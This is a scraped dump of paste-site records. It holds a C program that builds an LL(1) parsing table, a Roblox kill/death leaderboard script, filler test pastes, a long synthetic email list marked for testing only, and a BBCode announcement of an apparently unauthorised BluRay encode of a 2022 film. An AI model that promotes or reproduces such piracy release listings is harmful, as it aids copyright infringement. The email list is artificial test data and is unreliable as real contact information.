\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FOLLOW_B(sc, nt);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[nt - \'A\'][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (x == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FOLLOW_A_to_FOLLOW_B(pro[i].str[0], nt);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FIRST_B(char A, char B) {\n\xa0 \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[B - \'A\'][i] = first[A - \'A\'][i] || first[B - \'A\'][i];\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}\nvoid FIRST() {\n\xa0 \xa0 int i, j;\n\xa0 \xa0 int t = 0;\n\xa0 \xa0 while (t < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[j];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FIRST_B(sc, pro[i].str[0]);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[pro[i].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (j == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[pro[i].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'] = 1;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 ++t;\n\xa0\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FIRST_RHS__B(char A, int B) {\n\xa0 \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[B][i] = first[A\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][i] || first_rhs[B][i];\n\xa0\n\xa0 \xa0 }\n}\nvoid FIRST_RHS() {\n\xa0 \xa0 int i, j;\n\xa0 \xa0 int t = 0;\n\xa0 \xa0 while (t < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[j];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FIRST_RHS__B(sc, i);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[i][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (j == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[i][\'^\'] = 1;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 ++t;\n\xa0\n\xa0 \xa0 }\n}\nint main() {\n\xa0 \xa0 printf(""UE193117 UDESH BIND PRODUCTIONS:"");\n\xa0 \xa0 readFromFile();\n\xa0 \xa0 follow[pro[0].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0- \'A\'][\'$\'] = 1;\n\xa0 \xa0 FIRST();\n\xa0 \xa0 FOLLOW();\n\xa0 \xa0 FIRST_RHS();\n\xa0 \xa0 int i, j, k;\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char c = pro[i].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""FIRST OF %c: "", c);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[c - \'A\'][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char c = pro[i].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""FOLLOW OF %c: "", c);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (follow[c - \'A\'][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 printf(""FIRST OF %s: "", pro[i].str);\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first_rhs[i][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 }\n\xa0 \xa0 terminal[\'$\'] = 1;\n\xa0 \xa0 terminal[\'^\'] = 0;\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 printf(""\\n\\t**************** LL(1) PARSING TABLE *******************\\n"");\n\xa0 \xa0 printf(""\\t--------------------------------------------------------\\n"");\n\xa0 \xa0 printf(""%-10s"", """");\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (terminal[i]) printf(""%-10c"", i);\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 int p = 0;\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != 0 && (pro[i].str[0] != pro[i - 1].str[0]))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 p = p + 1;\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first_rhs[i][j] && j != \'^\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 table[p][j] = i + 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (first_rhs[i][\'^\']) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (k = 0; k < TSIZE; ++k) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (follow[pro[i].str[0] - \'A\'][k]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 table[p][k] = i + 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 k = 0;\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10c"", pro[i].str[0]);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (table[k][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10s"", pro[table[k][j] - 1].str);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (terminal[j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10s"", """");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++k;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 return 0;\n}', date='2022-06-01 08:34:17 +00:00', hash_val='fd44fd9f60762b088c18d5c71821c406', url='/qdR5zyy2', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 7', content='marvel super hero supercalifragilisticexpialidocious cape cloak villain', date='2022-06-01 08:25:17 +00:00', hash_val='79bef4879974aeaf07c8cbf1d9e35a8e', url='/rcX9dTCJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 5', content='yacht supercalifragilisticexpialidocious bosun deckhand stewardess', date='2022-06-01 08:23:15 +00:00', hash_val='9e9bb4e4aeadd80b4327c590edfbbf55', url='/2iPjcm3r', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 3', content='dave supercalifragilisticexpialidocious test', date='2022-06-01 08:20:16 +00:00', hash_val='37094481a6b74ce4d004113a2a875152', url='/srQ8CL61', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='trds', title='Untitled', content='[pre][b][font=Lucida Console][u]The.Contractor.2022.720p.BluRay.DD+5.1.x264-playHD[/u][/font][/b]\n\xa0\n[b][u]RELEASE iNFO:[/b][/u]\nRELEASE SIZE........: 6.24 GiB\nRUNTIME.............: 1 h 43 min\nVIDEO CODEC.........: x264, L4.1 @ CRF\nBITRATE.............: 7 621 kb/s\nRESOLUTION..........: 1280x536 pixels\nFRAMERATE...........: 23.976 (24000/1001) FPS\nAUDIO...............: English DD+5.1 at 1 024 kb/s \xa0\nSUBTITLES...........: English Forced \nSUBTITLES...........: English \xa0\nSUBTITLES...........: English SDH \nSUBTITLES...........: [b][color=#4bb702]Romanian[/b][/color] \xa0 \nCHAPTERS............: Yes\nSOURCE NAME.........: Remux\nIMDb LINK...........: https://www.imdb.com/title/tt10323676/\nENCODER.............: [b][color=#4bb702]JigSaw @[/b][/color] [b][color=#FFD700]playHD[/b][/color]\nNOTES...............: Manual overlay to fix top & bottom dirty lines.\n\xa0\n[quote]x264 [info]: frame I:1101 \xa0Avg QP:12.78 \xa0size:118418\nx264 [info]: frame P:30020 Avg QP:13.93 \xa0size: 64802\nx264 [info]: frame B:117584 Avg QP:14.94 \xa0size: 32595\nx264 [info]: consecutive B-frames: \xa01.5% \xa01.8% \xa09.8% 15.6% 13.9% 34.3% \xa08.8% \xa04.8% \xa04.7% \xa04.7%[/quote][/pre]\n\xa0\n[center]\n[b][font=Lucida Console]Source | playHD[/b][/font]\n\xa0\n[URL=https://imgbox.com/WQLmt2zG][IMG]https://thumbs2.imgbox.com/57/a5/WQLmt2zG_t.png[/IMG][/URL] [URL=https://imgbox.com/rs6wNfgv][IMG]https://thumbs2.imgbox.com/78/97/rs6wNfgv_t.png[/IMG][/URL] [URL=https://imgbox.com/WJRdB76f][IMG]https://thumbs2.imgbox.com/5d/51/WJRdB76f_t.png[/IMG][/URL] [URL=https://imgbox.com/tA5fvHRS][IMG]https://thumbs2.imgbox.com/a9/b6/tA5fvHRS_t.png[/IMG][/URL] [URL=https://imgbox.com/1UjP8PAj][IMG]https://thumbs2.imgbox.com/12/1a/1UjP8PAj_t.png[/IMG][/URL] [URL=https://imgbox.com/mk8CdM25][IMG]https://thumbs2.imgbox.com/d7/9b/mk8CdM25_t.png[/IMG][/URL] [URL=https://imgbox.com/iufgW7Au][IMG]https://thumbs2.imgbox.com/67/a6/iufgW7Au_t.png[/IMG][/URL] [URL=https://imgbox.com/rI6Gse26][IMG]https://thumbs2.imgbox.com/49/a3/rI6Gse26_t.png[/IMG][/URL] [URL=https://imgbox.com/d5ZEWKRe][IMG]https://thumbs2.imgbox.com/21/f6/d5ZEWKRe_t.png[/IMG][/URL] [URL=https://imgbox.com/n2lRQPxE][IMG]https://thumbs2.imgbox.com/e9/41/n2lRQPxE_t.png[/IMG][/URL] [URL=https://imgbox.com/YhOzGS5D][IMG]https://thumbs2.imgbox.com/0a/99/YhOzGS5D_t.png[/IMG][/URL] [URL=https://imgbox.com/IS3pxSog][IMG]https://thumbs2.imgbox.com/de/6e/IS3pxSog_t.png[/IMG][/URL]\n\xa0\n[img=https://i.postimg.cc/MpRJJt3Z/play-HD.png][/center]', date='2022-06-01 08:11:00 +00:00', hash_val='96308e1acf43aa8e7c3456982ef10ddb', url='/r0EmaSbG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='dubleeyrblxx', title='Kills and Deaths -- Roblox', content='game.Players.PlayerAdded:Connect(function(player)\n\xa0\n\xa0 \xa0 local spectator = game:GetService(\'Teams\'):FindFirstChild(""Spectator"")\n\xa0\n\xa0 \xa0 local leaderstats = Instance.new(""Folder"", player)\n\xa0 \xa0 leaderstats.Name = ""leaderstats""\n\xa0 \xa0 \n\xa0 \xa0 local kills = Instance.new(""NumberValue"",leaderstats)\n\xa0 \xa0 kills.Name = ""Kills""\n\xa0 \xa0 kills.Value = 0\n\xa0 \xa0 \n\xa0 \xa0 local deaths = Instance.new(""NumberValue"", leaderstats)\n\xa0 \xa0 deaths.Name = ""Deaths""\n\xa0 \xa0 deaths.Value = 0\n\xa0 \xa0 \n\xa0 \xa0 player.CharacterAdded:Connect(function(character)\n\xa0 \xa0 \xa0 \xa0 local humanoid = character:FindFirstChild(""Humanoid"")\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 humanoid.Died:Connect(function(died)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 deaths.Value = deaths.Value + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 local tag = humanoid:FindFirstChild(""creator"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 local killer = tag.Value\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if tag and killer then\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 killer.leaderstats:FindFirstChild(""Kills"").Value = killer.leaderstats:FindFirstChild(""Kills"").Value + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 end\n\xa0 \xa0 \xa0 \xa0 end)\n\xa0 \xa0 end)\nend)', date='2022-06-01 07:46:51 +00:00', hash_val='766dac8922e30bb00a805f57dde31586', url='/CYkqZSc5', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='emails', content="Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY\n\xa0\nDATA_ID_TESTDATATOFIND NOEXCLUDES\n\xa0\nCooper.Kleine@findmetesting.co.uk \nMariquilla.Evenden@findmetesting.co.uk \nNoll.Ingolotti@findmetesting.co.uk \xa0\nGrove.Feldbaum@findmetesting.co.uk \nMack.Osment@findmetesting.co.uk \nTrisha.Zanicchelli@findmetesting.co.uk\nJack.Gorriessen@findmetesting.co.uk \nNefen.Malec@findme-testing.co.uk \nBirdie-Gemmill@findmetesting.co.uk\nRosabella.Nias@findmetesting.co.uk\nEllerey.Fanti@findmetesting.cn\nAntonina.Carsey@findmetesting.cn\nValry.Shead@findmetesting.cn \nConrade.Ferrarone@findmetesting.cn\nNeysa.Fazakerley@findmetesting.cn\nCristobal.Primak@findmetesting.cn\nWakefield.Kent@findmetesting.cn\nfindme.Cheales@findmetesting.cn\nNert.Roddamr@findmetesting.cn \nRichy.Raft@findmetesting.cn\nBerget.Kermannes@findmetesting.ie \nShelden.Tregea@findmetesting.ie \nAllsun.Badrick@findmetesting.ie \nHortense.Ivkovic@findmetesting.ie\nCarolin.Potte@findmetesting.ie\nBenjie.Trumble@findmetesting.ie\nAndrew.Hadgkiss@findmetesting.ie\nTrula.Kuna@findmetesting.ie\nTommie.Maytum@findmetesting.ie\nLangsdon.Pakes@findmetesting.ie\nPorty.Tooth@findmetesting.au\nRozella.Siggefindmetesting.au\nNolie.Tumultyfindmetesting.au\nDud.Caustonfindmetesting.au\nAlvinia.Brameldfindmetesting.au\nMeridel.Lymbournefindmetesting.au\nElvis.Maleckfindmetesting.au\nBrett.Oughtonfindmetesting.au\nRickard.Clemfindmetesting.au\nPrue.Firemanfindmetesting.au\nUriel.Rozenbaum@findmetesting25.com\nCindie.Greeson@findmetesting25.com\nLaurette.Puckham@findmetesting25.com\nEldredge.Ricket@findmetesting25.com\nAlanah.Rapper@findmetesting25.com\nAsh.Le.Prevost@findmetesting25.com\nGalvin.Purchon@findmetesting25.com\nLauryn.Ilson@findmetesting25.com\nfindme.Graffin@findmetesting25.com\nEdithe.Trehearne@findmetesting25.com\nDen.Cancutt@findmetesting10.com\nWernher.Spatoni@findmetesting10.com\nMalchy.Ion@findmetesting10.com\nLeona.Whitby@findmetesting10.com\nAlphonse.Goodlake@findmetesting10.com\nGran.Standen@findmetesting10.com\nBarnie.Gilffilland@findmetesting10.com\nKaylyn.Ditchfield@findmetesting10.com\nDorotea.Kohlerman@findmetesting10.com\nGillan.Lampel@findmetesting10.com\nPatrica.Mannakee@findustesting.com\nPippo.Sewart@findustesting.com\nLanae.Cousin@findustesting.com\nPorter.Glaysher@findustesting.com\nHerschel.Yaakov@findustesting.com\nfindme.Parsand@findustesting.com\nLucho.Cosh@findustesting.com\nCullie.Powlesland@findustesting.com\nEdy.Burkart@findustesting.com\nChristophorus.Ackeroyd@findustesting.com\nArvy.Rowson@findUStesting.com\nArlan.Ivanilov@findustesting.com\nTawnya.Waslin@findustesting.com\nInigo.Gyrgorcewicx@findustesting.com\nSharity.Stoodley@findustesting.com\nGinger.Dresse@findustesting.com\nDeck.Jouannot@findustesting.com\nDeny.Soanes@findustesting.com\njames@findmetesting.com\n\xa0\nWenona.Moverley@findqatesting.com\nJerry.Poynter@findqatesting.com\nDrugi.Neeson@findqatesting.com\nWinny.Binfield@findqatesting.com\nDarill.Greenshiels@findqatesting.com\nEthelin.Pinchen@findqatesting.com\nTanney.Ballendine@findqatesting.com\nAriadne.Wincott@findqatesting.com\nWinnie.Domm@findqatesting.com\nRogerio.Cudbird@findqatesting.com\nYu@findmetesting.com\n\xa0\nRIGHT OF @\nfindme@findme.testing.com\nwildcard@findme*testing.com\ndash@findme-testing.com\nslash@findme/testing.com\nquestionmark@findme?testing.com\n\xa0\nACCENTS\nPål@findmetesting.com\nMagdalène@findmetesting.com\nAnaël@findmetesting.com\nLén@findmetesting.com\nLoïs@findmetesting.com\nThérèsa@findmetesting.com\nValérie@findmetesting.com\nGörel@findmetesting.com\nMélia@findmetesting.com\nJoséphine@findmetesting.com\nLoïc@findmetesting.com\nfindme@findmetesting.com\nMéghane@findmetesting.com\nNuó@findmetesting.com\nLén@findmetesting.com\nEliès@findmetesting.com\nAndré@findmetesting.com\nMahélie@findmetesting.com\nMéthode@findmetesting.com\nRachèle@findmetesting.com\nMélina@findmetesting.com\nGaëlle@findmetesting.com\nCéline@findmetesting.com\nBérangère@findmetesting.com\nFrançoise@findmetesting.com\nSéverine@findmetesting.com\nMåns@findmetesting.com\nAdèle@findmetesting.com\nAimée@findmetesting.com\nMélia@findmetesting.com\nGösta@findmetesting.com\nLaurène@findmetesting.com\nGisèle@findmetesting.com\nMélinda@findmetesting.com\nBécassine@findmetesting.com\nRuì@findmetesting.com\nZoé@findmetesting.com\nMaëline@findmetesting.com\nAimée@findmetesting.com\nAndréanne@findmetesting.com\nAdélaïde@findmetesting.com\nLaurène@findmetesting.com\nAnaé@findmetesting.com\nNoëlla@findmetesting.com\nAnaël@findmetesting.com\nMaëlyss@findmetesting.com\nLucrèce@findmetesting.com\nLén@findmetesting.com\nMarie-thérèse@findmetesting.com\nMaéna@findmetesting.com\nHélène@findmetesting.com\nHélèna@findmetesting.com\nMéng@findmetesting.com\nCrééz@findmetesting.com\nMélanie@findmetesting.com\nFrédérique@findmetesting.com\nMédiamass@findmetesting.com\nAndré@findmetesting.com\nCinéma@findmetesting.com\nMégane@findmetesting.com\nAmélie@findmetesting.com\nNadège@findmetesting.com\nRébecca@findmetesting.com\nMédiamass@findmetesting.com\nCéline@findmetesting.com\nMaïly@findmetesting.com\nMaï@findmetesting.com\nMaëlann@findmetesting.com\nNoëlla@findmetesting.com\nLaurélie@findmetesting.com\nRuì@findmetesting.com\nChloé@findmetesting.com\nGaëlle@findmetesting.com\nVénus@findmetesting.com\nFrédérique@findmetesting.com\nAmélie@findmetesting.com\nLoïs@findmetesting.com\nMarlène@findmetesting.com\nStévina@findmetesting.com\nClémentine@findmetesting.com\nMégane@findmetesting.com\nMéng@findmetesting.com\nAndré@findmetesting.com\nCrééz@findmetesting.com\nAí@findmetesting.com\nUò@findmetesting.com\nYú@findmetesting.com\nMarie-françoise@findmetesting.com\nUò@findmetesting.com\